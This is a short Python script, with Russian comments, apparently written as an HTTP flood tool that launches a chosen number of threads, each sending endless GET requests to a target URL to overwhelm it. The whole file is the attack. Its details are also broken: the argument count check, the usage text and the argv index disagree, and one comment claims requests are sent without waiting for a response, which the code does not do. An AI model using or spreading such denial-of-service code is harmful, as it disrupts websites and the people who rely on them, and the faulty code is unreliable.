import requests
import threading
import sys

def http_nul_attack(target_url, num_threads):
    try:
        def send_request():
            while True:
                try:
                    # Оптимизированная отправка запроса без ожидания ответа
                    session = requests.Session()
                    session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=num_threads, pool_maxsize=num_threads))
                    session.get(target_url)
                    print("Sent HTTP request without waiting for response")
                except requests.RequestException as e:
                    print(f"Error: {e}")

        # Запуск указанного количества потоков
        threads = [threading.Thread(target=send_request) for _ in range(num_threads)]
        for thread in threads:
            thread.start()

        # Ожидание завершения всех потоков
        for thread in threads:
            thread.join()

    except ValueError:
        print("Некорректное количество потоков.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Используйте: python3 main.py <адрес_цели> <количество_потоков>")
        sys.exit(1)

    target_url = sys.argv[1]
    num_threads = int(sys.argv[3])

    # Пример использования
    http_nul_attack(target_url, num_threads)
